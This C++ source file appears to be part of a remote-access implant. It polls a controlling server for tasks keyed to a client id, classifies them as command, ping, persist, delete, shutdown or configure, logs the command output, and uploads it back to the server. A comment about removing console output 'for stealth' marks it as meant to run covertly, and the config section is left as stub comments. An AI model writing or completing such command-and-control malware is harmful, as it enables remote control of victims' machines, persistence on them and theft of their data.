#include <boost/beast/core.hpp>
#include <boost/beast/http.hpp>
#include <nlohmann/json.hpp>
#include <iostream>
#include <string>

#include "globals.hpp"

using namespace nlohmann;
namespace http = beast::http;

////TASK FUNCS
//read task
TASK_STATUS Pottask::readTask()
{
    try {
        auto task_response = getRequest("/tasks/client/" + client_id);
        if(task_response.res_body.result() == http::status::ok){
            task_array = json::parse(task_response.res_body.body());

            if (task_array.empty())
            {
                return NOTASK;
            }
            else
            {
                std::cout << "have tasks" << std::endl;
                return TASK;
            }

        }
        else
        {
            std::cout << "server error" << std::endl;
            return CONNERROR;
        }
    }
    //return 2 if connection error/timeout
    catch(std::exception const& e)
    {
        //std::cerr << "Error: " << e.what() << std::endl;
        return CONNERROR;
    }
    std::cout << "readTask done" << std::endl;
}
//add log
void Pottask::addLog(json json_object, std::string command_output)
{
    //add info to task array
    json current_log;
    std::cout << current_log << std::endl;
    current_log["log_client_id"] = client_id;
    current_log["log_cmd_type"] = json_object["task_cmd_type"];
    current_log["log_cmd_input"] = json_object["task_cmd_input"];
    current_log["log_issue_date"] = json_object["task_issue_date"];
    current_log["exec_date"] = getTime();
    current_log["task_id"] = json_object["id"];
    current_log["log_cmd_output"] = command_output;

    log_array.insert(log_array.end(), current_log);
}
//upload log
void Pottask::uploadLog()
{
    //rate limiting delay
    //need try/catch for error handling
    for (const auto& item : log_array.items())
    {
        std::cout << item.value().dump() << std::endl;//remove for stealth?
        item.value()["send_time"] = getTime();
        postRequest("/logs", "data=" + item.value().dump());
        //sleep for rate limiting
        //if successful, remove item; if not, skip
    }
    log_array = json::array();
    std::cout << "uploadLog done" << std::endl;
}
//return task type
TASK_TYPE Pottask::switchTask(json input_task)
{
    if (input_task["task_cmd_type"] == "command")
    {
        return COMMAND;
    }
    else if (input_task["task_cmd_type"] == "ping")
    {
        return PING;
    }
    else if (input_task["task_cmd_type"] == "persist")
    {
        return PERSIST;
    }
    else if (input_task["task_cmd_type"] == "delete")
    {
        return DELETE;
    }
    else if (input_task["task_cmd_type"] == "shutdown")
    {
        return SHUTDOWN;
    }
    else if (input_task["task_cmd_type"] == "configure")
    {
        return CONFIG;
    }
    //put something here
}
//set config
    //take json
    //update variables
